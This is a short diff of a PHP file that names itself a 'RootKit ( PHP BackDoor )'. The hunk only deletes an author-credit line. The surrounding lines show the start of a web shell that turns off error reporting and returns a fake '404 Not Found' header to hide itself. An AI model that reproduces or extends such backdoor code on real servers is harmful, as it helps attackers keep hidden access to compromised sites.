@@ -1,6 +1,5 @@
 <?php
 // RootKit ( PHP BackDoor )
-// Coded By Afrizal F.A - ICWR-TECH
 // Copyright (C)2019 - ICWR-TECH
 error_reporting(0);
 header('HTTP/1.0 404 Not Found', true, 404);
